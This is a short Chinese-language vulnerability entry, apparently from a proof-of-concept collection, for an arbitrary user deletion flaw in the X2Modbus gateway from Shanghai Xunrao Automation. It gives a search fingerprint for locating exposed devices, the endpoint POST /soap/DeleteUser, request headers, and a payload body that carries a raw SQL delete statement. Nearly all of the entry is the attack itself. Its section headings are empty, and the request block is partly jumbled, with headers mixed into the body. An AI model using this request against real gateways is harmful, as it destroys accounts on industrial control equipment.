# 上海迅饶自动化科技有限公司X2Modbus网关任意用户删除漏洞

- **系统**：上海迅饶自动化科技有限公司X2Modbus网关任意用户删除　|　**类型**：其他　|　**CVE**：—
- **指纹**：`server="SunFull-Webs"`
- **请求**：`POST /soap/DeleteUser HTTP/1.1`

**请求体 / payload**
```
删除前账号\
Host:
Content-Type: text/xml; charset=utf-8
X-Requested-With: XMLHttpRequest
Content-Length: 39
Cookie: language=zh-cn; language=zh-cn
delete from userid where username='stc'

删除后\
```

**其他**
- 上海迅饶自动化科技有限公司X2Modbus网关任意用户删除漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * X2Modbus